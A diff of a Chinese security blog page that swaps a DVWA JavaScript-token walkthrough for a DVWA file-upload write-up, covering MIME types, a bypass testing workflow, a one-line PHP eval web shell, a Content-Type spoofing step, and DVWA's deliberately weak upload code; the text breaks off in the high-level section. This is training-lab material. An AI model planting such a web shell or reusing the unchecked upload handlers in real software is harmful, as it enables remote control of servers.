@@ -2,33 +2,33 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Dvwa-JavaScript | ZJR&#39;blog</title>
-  <meta name="keywords" content=" JavaScript ">
-  <meta name="description" content="Dvwa-JavaScript | ZJR&#39;blog">
+  <title>Dvwa-FileUpload | ZJR&#39;blog</title>
+  <meta name="keywords" content=" FileUpload ">
+  <meta name="description" content="Dvwa-FileUpload | ZJR&#39;blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="跨站脚本（Cross Site Scripting）攻击，没有对web前端的输入边界进行严格的过滤是SXX漏洞形成的主要原因攻击者可以通过构造脚本语句使得输入的内容被当作HTML的一部分来执行，当用户访问到该页面时，就会触发该恶意脚本，从而获取用户的敏感数据（比如cookie数据）XSS漏洞发生在web前端，主要对网站用户造成危害，并不会直接危害服务器后台数据 XSS类型：  反射型XSS：通过X">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Dvwa-XSS">
-<meta property="og:url" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/index.html">
+<meta property="og:url" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/index.html">
 <meta property="og:site_name" content="ZJR&#39;blog">
 <meta property="og:description" content="跨站脚本（Cross Site Scripting）攻击，没有对web前端的输入边界进行严格的过滤是SXX漏洞形成的主要原因攻击者可以通过构造脚本语句使得输入的内容被当作HTML的一部分来执行，当用户访问到该页面时，就会触发该恶意脚本，从而获取用户的敏感数据（比如cookie数据）XSS漏洞发生在web前端，主要对网站用户造成危害，并不会直接危害服务器后台数据 XSS类型：  反射型XSS：通过X">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/1.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/2.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/3.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/4.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/5.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/6.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/7.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/8.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/9.png">
-<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/10.png">
-<meta property="article:published_time" content="2020-03-30T10:02:16.000Z">
-<meta property="article:modified_time" content="2020-03-30T10:13:14.274Z">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/1.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/2.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/3.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/4.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/5.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/6.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/7.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/8.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/9.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/10.png">
+<meta property="article:published_time" content="2020-04-09T10:02:16.000Z">
+<meta property="article:modified_time" content="2020-04-10T11:31:09.235Z">
 <meta property="article:author" content="ZJR">
 <meta property="article:tag" content="XSS">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/1.png">
+<meta name="twitter:image" content="http://zjr-g.github.io/2020/04/09/Dvwa-XSS/1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -143,7 +143,7 @@
     
         
             
-            <li><div data-rel="Tips">Tips</div>
+            <li><div data-rel="CTF">CTF</div>
                 
             </li>
             
@@ -151,7 +151,7 @@
     
         
             
-            <li><div data-rel="CTF">CTF</div>
+            <li><div data-rel="Tips">Tips</div>
                 
             </li>
             
@@ -218,15 +218,15 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a class="color1">aes加密</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color2">base64</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color3">ctf-web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">aes加密</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -246,15 +246,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color2">FileInclude</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color1">FileUpload</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color1">InsecureCAPTCHA</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">FileInclude</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -262,11 +258,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">SQLInject</a>
+        <a class="color1">FileUpload</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">WeakSessionIDs</a>
+        <a class="color5">SQLInject</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -274,7 +270,19 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color4">Git</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">WeakSessionIDs</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color4">file_incloude</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_regexp</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -282,19 +290,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">Git</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">MySql_select</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">MySql_order by</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">MySql_regexp</a>
+        <a class="color3">MySql_concat</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -306,11 +302,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">MySql_concat</a>
+        <a class="color5">MySql_function</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">MySql_function</a>
+        <a class="color5">MySql_subquery</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -323,14 +319,6 @@
     
     <li class="article-tag-list-item">
         <a class="color3">MySql_having</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">MySql_subquery</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color2">MySql_union</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -358,7 +346,19 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color3">MySql_select</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_order by</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color4">zip</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_union</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -374,14 +374,6 @@
 
     
     <nav id="title-list-nav">
-        
-        <a  class="Tips "
-           href="/2020/02/18/Aes/"
-           data-tag="aes加密"
-           data-author="" >
-            <span class="post-title" title="Aes加密解析">Aes加密解析</span>
-            <span class="post-date" title="2020-02-18 11:13:30">2020/02/18</span>
-        </a>
         
         <a  class="CTF "
            href="/2020/02/11/Base64/"
@@ -399,12 +391,20 @@
             <span class="post-date" title="2020-02-28 20:11:44">2020/02/28</span>
         </a>
         
+        <a  class="Tips "
+           href="/2020/02/18/Aes/"
+           data-tag="aes加密"
+           data-author="" >
+            <span class="post-title" title="Aes加密解析">Aes加密解析</span>
+            <span class="post-date" title="2020-02-18 11:13:30">2020/02/18</span>
+        </a>
+        
         <a  class="CTF "
-           href="/2020/03/03/CTF-web-02/"
+           href="/2020/03/13/CTF-web-04/"
            data-tag="ctf-web"
            data-author="" >
-            <span class="post-title" title="CTF-web-02">CTF-web-02</span>
-            <span class="post-date" title="2020-03-03 22:48:14">2020/03/03</span>
+            <span class="post-title" title="CTF-web-04">CTF-web-04</span>
+            <span class="post-date" title="2020-03-13 15:33:04">2020/03/13</span>
         </a>
         
         <a  class="CTF "
@@ -416,11 +416,11 @@
         </a>
         
         <a  class="CTF "
-           href="/2020/03/13/CTF-web-04/"
+           href="/2020/03/03/CTF-web-02/"
            data-tag="ctf-web"
            data-author="" >
-            <span class="post-title" title="CTF-web-04">CTF-web-04</span>
-            <span class="post-date" title="2020-03-13 15:33:04">2020/03/13</span>
+            <span class="post-title" title="CTF-web-02">CTF-web-02</span>
+            <span class="post-date" title="2020-03-03 22:48:14">2020/03/03</span>
         </a>
         
         <a  class="DVWA "
@@ -432,83 +432,91 @@
         </a>
         
         <a  class="DVWA "
-           href="/2020/03/30/Dvwa-CSPBypass/"
+           href="/2020/04/01/Dvwa-CSPBypass/"
            data-tag="CSPBypass"
            data-author="" >
             <span class="post-title" title="Dvwa-CSPBypass">Dvwa-CSPBypass</span>
-            <span class="post-date" title="2020-03-30 17:55:13">2020/03/30</span>
+            <span class="post-date" title="2020-04-01 17:55:13">2020/04/01</span>
         </a>
         
         <a  class="DVWA "
-           href="/2020/03/30/Dvwa-CommandInject/"
+           href="/2020/03/31/Dvwa-CommandInject/"
            data-tag="CommandInject"
            data-author="" >
             <span class="post-title" title="Dvwa-CommandInject">Dvwa-CommandInject</span>
-            <span class="post-date" title="2020-03-30 17:45:20">2020/03/30</span>
+            <span class="post-date" title="2020-03-31 17:45:20">2020/03/31</span>
         </a>
         
         <a  class="DVWA "
-           href="/2020/03/30/Dvwa-CSRF/"
+           href="/2020/04/02/Dvwa-CSRF/"
            data-tag="CSRF"
            data-author="" >
             <span class="post-title" title="Dvwa-CSRF">Dvwa-CSRF</span>
-            <span class="post-date" title="2020-03-30 17:58:21">2020/03/30</span>
+            <span class="post-date" title="2020-04-02 17:58:21">2020/04/02</span>
         </a>
         
         <a  class="DVWA "
-           href="/2020/03/30/Dvwa-FileInclude/"
-           data-tag="FileInclude"
-           data-author="" >
-            <span class="post-title" title="Dvwa-FileInclude">Dvwa-FileInclude</span>
-            <span class="post-date" title="2020-03-30 18:01:08">2020/03/30</span>
-        </a>
-        
-        <a  class="DVWA "
-           href="/2020/03/30/Dvwa-FileUpload/"
-           data-tag="FileUpload"
-           data-author="" >
-            <span class="post-title" title="Dvwa-FileUpload">Dvwa-FileUpload</span>
-            <span class="post-date" title="2020-03-30 18:01:16">2020/03/30</span>
-        </a>
-        
-        <a  class="DVWA "
-           href="/2020/03/30/Dvwa-InsecureCAPTCHA/"
+           href="/2020/04/05/Dvwa-InsecureCAPTCHA/"
            data-tag="InsecureCAPTCHA"
            data-author="" >
             <span class="post-title" title="Dvwa-InsecureCAPTCHA">Dvwa-InsecureCAPTCHA</span>
-            <span class="post-date" title="2020-03-30 18:01:32">2020/03/30</span>
+            <span class="post-date" title="2020-04-05 18:01:32">2020/04/05</span>
         </a>
         
         <a  class="DVWA "
-           href="/2020/03/30/Dvwa-JavaScript/"
+           href="/2020/04/03/Dvwa-FileInclude/"
+           data-tag="FileInclude"
+           data-author="" >
+            <span class="post-title" title="Dvwa-FileInclude">Dvwa-FileInclude</span>
+            <span class="post-date" title="2020-04-03 18:01:08">2020/04/03</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/04/06/Dvwa-JavaScript/"
            data-tag="JavaScript"
            data-author="" >
             <span class="post-title" title="Dvwa-JavaScript">Dvwa-JavaScript</span>
-            <span class="post-date" title="2020-03-30 18:01:47">2020/03/30</span>
+            <span class="post-date" title="2020-04-06 18:01:47">2020/04/06</span>
         </a>
         
         <a  class="DVWA "
-           href="/2020/03/30/Dvwa-SQLInject/"
+           href="/2020/04/04/Dvwa-FileUpload/"
+           data-tag="FileUpload"
+           data-author="" >
+            <span class="post-title" title="Dvwa-FileUpload">Dvwa-FileUpload</span>
+            <span class="post-date" title="2020-04-04 18:01:16">2020/04/04</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/04/07/Dvwa-SQLInject/"
            data-tag="SQLInject"
            data-author="" >
             <span class="post-title" title="Dvwa-SQLInject">Dvwa-SQLInject</span>
-            <span class="post-date" title="2020-03-30 18:01:58">2020/03/30</span>
+            <span class="post-date" title="2020-04-07 18:01:58">2020/04/07</span>
         </a>
         
         <a  class="DVWA "
-           href="/2020/03/30/Dvwa-WeakSessionIDs/"
-           data-tag="WeakSessionIDs"
-           data-author="" >
-            <span class="post-title" title="Dvwa-WeakSessionIDs">Dvwa-WeakSessionIDs</span>
-            <span class="post-date" title="2020-03-30 18:02:09">2020/03/30</span>
-        </a>
-        
-        <a  class="DVWA "
-           href="/2020/03/30/Dvwa-XSS/"
+           href="/2020/04/09/Dvwa-XSS/"
            data-tag="XSS"
            data-author="" >
             <span class="post-title" title="Dvwa-XSS">Dvwa-XSS</span>
-            <span class="post-date" title="2020-03-30 18:02:16">2020/03/30</span>
+            <span class="post-date" title="2020-04-09 18:02:16">2020/04/09</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/18/Git/"
+           data-tag="Git"
+           data-author="" >
+            <span class="post-title" title="Git">Git</span>
+            <span class="post-date" title="2020-02-18 19:47:13">2020/02/18</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/04/08/Dvwa-WeakSessionIDs/"
+           data-tag="WeakSessionIDs"
+           data-author="" >
+            <span class="post-title" title="Dvwa-WeakSessionIDs">Dvwa-WeakSessionIDs</span>
+            <span class="post-date" title="2020-04-08 18:02:09">2020/04/08</span>
         </a>
         
         <a  class="Tips "
@@ -520,30 +528,6 @@
         </a>
         
         <a  class="MySqlCourse "
-           href="/2020/01/31/MySql-Course01/"
-           data-tag="MySql_show"
-           data-author="" >
-            <span class="post-title" title="MySql(连接，创建等操作)">MySql(连接，创建等操作)</span>
-            <span class="post-date" title="2020-01-31 21:02:14">2020/01/31</span>
-        </a>
-        
-        <a  class="Tips "
-           href="/2020/02/18/Git/"
-           data-tag="Git"
-           data-author="" >
-            <span class="post-title" title="Git">Git</span>
-            <span class="post-date" title="2020-02-18 19:47:13">2020/02/18</span>
-        </a>
-        
-        <a  class="MySqlCourse "
-           href="/2020/02/01/MySql-Course02/"
-           data-tag="MySql_select,MySql_order by"
-           data-author="" >
-            <span class="post-title" title="MySql(select的使用)">MySql(select的使用)</span>
-            <span class="post-date" title="2020-02-01 11:12:32">2020/02/01</span>
-        </a>
-        
-        <a  class="MySqlCourse "
            href="/2020/02/03/MySql-Course04/"
            data-tag="MySql_regexp"
            data-author="" >
@@ -552,11 +536,11 @@
         </a>
         
         <a  class="MySqlCourse "
-           href="/2020/02/02/MySql-Course03/"
-           data-tag="MySql_where,MySql_like"
+           href="/2020/01/31/MySql-Course01/"
+           data-tag="MySql_show"
            data-author="" >
-            <span class="post-title" title="MySql(数据过滤)">MySql(数据过滤)</span>
-            <span class="post-date" title="2020-02-02 10:55:26">2020/02/02</span>
+            <span class="post-title" title="MySql(连接，创建等操作)">MySql(连接，创建等操作)</span>
+            <span class="post-date" title="2020-01-31 21:02:14">2020/01/31</span>
         </a>
         
         <a  class="MySqlCourse "
@@ -568,11 +552,27 @@
         </a>
         
         <a  class="MySqlCourse "
+           href="/2020/02/02/MySql-Course03/"
+           data-tag="MySql_where,MySql_like"
+           data-author="" >
+            <span class="post-title" title="MySql(数据过滤)">MySql(数据过滤)</span>
+            <span class="post-date" title="2020-02-02 10:55:26">2020/02/02</span>
+        </a>
+        
+        <a  class="MySqlCourse "
            href="/2020/02/04/MySql-Course06/"
            data-tag="MySql_function"
            data-author="" >
             <span class="post-title" title="MySql(函数)">MySql(函数)</span>
             <span class="post-date" title="2020-02-04 10:33:02">2020/02/04</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/05/MySql-Course08/"
+           data-tag="MySql_subquery"
+           data-author="" >
+            <span class="post-title" title="MySql(子查询)">MySql(子查询)</span>
+            <span class="post-date" title="2020-02-05 11:04:05">2020/02/05</span>
         </a>
         
         <a  class="MySqlCourse "
@@ -589,22 +589,6 @@
            data-author="" >
             <span class="post-title" title="MySql(数据分组)">MySql(数据分组)</span>
             <span class="post-date" title="2020-02-05 09:49:48">2020/02/05</span>
-        </a>
-        
-        <a  class="MySqlCourse "
-           href="/2020/02/05/MySql-Course08/"
-           data-tag="MySql_subquery"
-           data-author="" >
-            <span class="post-title" title="MySql(子查询)">MySql(子查询)</span>
-            <span class="post-date" title="2020-02-05 11:04:05">2020/02/05</span>
-        </a>
-        
-        <a  class="MySqlCourse "
-           href="/2020/02/07/MySql-Course10/"
-           data-tag="MySql_union"
-           data-author="" >
-            <span class="post-title" title="MySql(组合查询UNION)">MySql(组合查询UNION)</span>
-            <span class="post-date" title="2020-02-07 11:37:50">2020/02/07</span>
         </a>
         
         <a  class="MySqlCourse "
@@ -631,12 +615,28 @@
             <span class="post-date" title="2020-02-28 20:52:27">2020/02/28</span>
         </a>
         
+        <a  class="MySqlCourse "
+           href="/2020/02/01/MySql-Course02/"
+           data-tag="MySql_select,MySql_order by"
+           data-author="" >
+            <span class="post-title" title="MySql(select的使用)">MySql(select的使用)</span>
+            <span class="post-date" title="2020-02-01 11:12:32">2020/02/01</span>
+        </a>
+        
         <a  class="Tips "
            href="/2020/02/11/Zip/"
            data-tag="zip"
            data-author="" >
             <span class="post-title" title="Zip结构及其伪加密">Zip结构及其伪加密</span>
             <span class="post-date" title="2020-02-11 21:03:24">2020/02/11</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/07/MySql-Course10/"
+           data-tag="MySql_union"
+           data-author="" >
+            <span class="post-title" title="MySql(组合查询UNION)">MySql(组合查询UNION)</span>
+            <span class="post-date" title="2020-02-07 11:37:50">2020/02/07</span>
         </a>
         
         <a  class="Tips "
@@ -667,9 +667,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Dvwa-JavaScript" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Dvwa-FileUpload" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Dvwa-JavaScript</h1>
+        <h1 class="article-title">Dvwa-FileUpload</h1>
     
     <div class="article-meta">
         
@@ -684,19 +684,19 @@
         
         <span class="tag">
             
-            <a class="color1">JavaScript</a>
+            <a class="color1">FileUpload</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-03-30 18:14:23'>2020-03-30 18:01</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-10 19:30:31'>2020-04-04 18:01</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:647</span>
+        <span>字数:1.6k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -715,7 +715,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#low级别"><span class="toc-text">low级别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium级别"><span class="toc-text">medium级别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high级别"><span class="toc-text">high级别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible级别"><span class="toc-text">impossible级别</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#开撸"><span class="toc-text">开撸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low级别"><span class="toc-text">low级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium级别"><span class="toc-text">medium级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hight级别"><span class="toc-text">hight级别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传漏洞绕过思路汇总"><span class="toc-text">文件上传漏洞绕过思路汇总</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防范措施"><span class="toc-text">防范措施</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -731,43 +731,134 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>JavaScript是前端脚本语言，作用于前端页面</p>
-<h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><p><img src="1.png" alt="1"><br>是一个提交框，提示输入success就能获胜<br>但是经过反复提交发现，都不能成功的提交，查看页面元素看看<br><img src="2.png" alt="2"><br>发现了这一条被隐藏的信息，原来点击提交时，还提交了token，这里利用bp抓包也能发现请求数据里还包含一个token，后台需要验证success的md5值和success这两部分。<br>继续往下还发现<br><img src="3.png" alt="3"><br>这个token是前端的函数生成的，这里默认的token是ChangeMe字符串生成的token，若不重新调用这个generate_token()函数，则token值就不会改变。<br>所以这里在对话框里输入success后，还要在控制台调用一下generate_token()函数。<br><img src="4.png" alt="4"><br><img src="5.png" alt="5"><br>可以看到token已经改变，现在点击提交，就能获胜了。</p>
-<h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p>题目还是一样的<br><img src="6.png" alt="6"><br>这里只是将JavaScript代码，单独保存在一个文件里，然后在前端调用。<br><img src="7.png" alt="7"><br>访问后可以找到JavaSctipt的源码，进行源码分析：</p>
-<pre><code class="javascript">function do_something(e){
-    for(var t=&quot;&quot;,n=e.length-1;n&gt;=0;n--)
-        t+=e[n];
-    return t
+        <p>文件上传漏洞概述<br>因为业务功能需要，很多web站点都有文件上传的接口（比如注册时上传的头像等）<br>由于没有对上传的文件类型进行严格的限制，导致攻击者可以上传一些恶意文件<br>从而使得攻击者可以通过对该恶意文件的访问来控制整个web后台</p>
+<p><strong>文件上传漏洞测试流程：</strong></p>
+<ul>
+<li>对文件上传的地方按照要求上传文件，查看返回结果（路径，提示）</li>
+<li>尝试上传不同类型的“恶意文件”，查看结果</li>
+<li>查看html源码，看看是否是前端限制</li>
+<li>尝试使用不同方式进行绕过：黑名单绕过/MIME类型绕过/目录路径绕过等</li>
+<li>猜测或其他方式得到木马路径，连接，即可使用</li>
+</ul>
+<h2 id="开撸"><a href="#开撸" class="headerlink" title="开撸"></a>开撸</h2><p>知识补充：<br>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p>
+<p>每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图像image等，后面定义具体的种类。常见MIME类型：</p>
+<ul>
+<li>超文本标记语言文本 .html text/html</li>
+<li>xml文档 .xml text/xml</li>
+<li>XHTML文档 .xhtml application/xhtml+xml</li>
+<li>普通文本 .txt text/plain</li>
+<li>RTF文本 .rtf application/rtf</li>
+<li>PDF文档 .pdf application/pdf</li>
+<li>Microsoft Word文件 .word application/msword</li>
+<li>PNG图像 .png image/png</li>
+<li>GIF图形 .gif image/gif</li>
+<li>JPEG图形 .jpeg,.jpg image/jpeg</li>
+<li>au声音文件 .au audio/basic</li>
+<li>MIDI音乐文件 mid,.midi audio/midi,audio/x-midi</li>
+<li>RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio</li>
+<li>MPEG文件 .mpg,.mpeg video/mpeg</li>
+<li>AVI文件 .avi video/x-msvideo</li>
+<li>GZIP文件 .gz application/x-gzip</li>
+<li>TAR文件 .tar application/x-tar</li>
+<li>任意的二进制数据 application/octet-stream</li>
+</ul>
+<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p>随便上传一个简单的木马</p>
+<pre><code class="php">&lt;?php @eval($_POST[cmd]);?&gt;</code></pre>
+<p><img src="1.png" alt="1"><br>可以看到上传成功，还返回了路径，使用工具连接即可<br>这里并没有对文件进行任何检查<br><img src="2.png" alt="2"><br>有一个文件大小的限制，但是是前端可以更改</p>
+<pre><code class="php">&lt;?php
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );
+    // Can we move the file to the upload folder?
+    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {
+        // No
+        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;
     }
-setTimeout(function(){
-    do_elsesomething(&quot;XX&quot;)
-    },300);
-function do_elsesomething(e){
-    document.getElementById(&quot;token&quot;).value=do_something(e+document.getElementById(&quot;phrase&quot;).value+&quot;XX&quot;)
-    }</code></pre>
-<p>这里的token就是由do_something()函数生成的，经过分析发现最后执行的语句是<code>do_something(&quot;XX&quot;+document.getElementById(&quot;phrase&quot;).value+&quot;XX&quot;)</code>这里e的值是setTimeout函数传过来的。<br>这里利用方法与low级别类似。<br>先在输入框内输入success，再调用do_elsesomething()函数。<br><img src="8.png" alt="8"><br><img src="9.png" alt="9"><br>此时提交即可</p>
-<h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p><img src="10.png" alt="10"><br>感觉和medium一样啊，看看JavaScript源码。<br><img src="11.png" alt="11"><br>这是什么？？？<br>看不懂，估计被加密了，丢去解密<a href="http://deobfuscatejavascript.com/#" target="_blank" rel="noopener">http://deobfuscatejavascript.com/#</a><br><img src="12.png" alt="12"><br>这样好多了，是熟悉的感觉，这里就是生成token的关键代码，提取出来分析一下。</p>
-<pre><code class="javascript">function do_something(e) {
-    for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n];
-    return t
+    else {
+        // Yes!
+        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
+    }
 }
-function token_part_3(t, y = &quot;ZZ&quot;) {
-    document.getElementById(&quot;token&quot;).value = sha256(document.getElementById(&quot;token&quot;).value + y)
+?&gt;</code></pre>
+<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p>先上传一张正常的图片文件，能给成功上传返回路径<br>上传个.php文件试试，发现上传失败，提示上传图片类型文件，观察网页源码分析并不是前端过滤<br>接下来利用bp抓包分析<br><img src="3.png" alt="3"><br>将类型更改为这个即可成功上传</p>
+<pre><code class="php">&lt;?php
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );
+    // File information
+    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];
+    $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; //MIME类型
+    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];
+    // Is it an image?
+    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) ) {
+
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {
+            // No
+            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;
+        }
+        else {
+            // Yes!
+            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
+        }
+    }
+    else {
+        // Invalid file
+        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;
+    }
 }
-function token_part_2(e = &quot;YY&quot;) {
-    document.getElementById(&quot;token&quot;).value = sha256(e + document.getElementById(&quot;token&quot;).value)
+?&gt;</code></pre>
+<p><font color=red>if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp; ( $uploaded_size &lt; 100000 ) )</font><br>关键代码，在后台检验类型，限制大小</p>
+<h3 id="hight级别"><a href="#hight级别" class="headerlink" title="hight级别"></a>hight级别</h3><pre><code class="php">&lt;?php
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );
+    // File information
+    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);//获取上传文件的后缀名
+    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];
+    $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];
+    // Is it an image?
+    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) &amp;&amp;
+        getimagesize( $uploaded_tmp ) ) {
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
+            // No
+            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;
+        }
+        else {
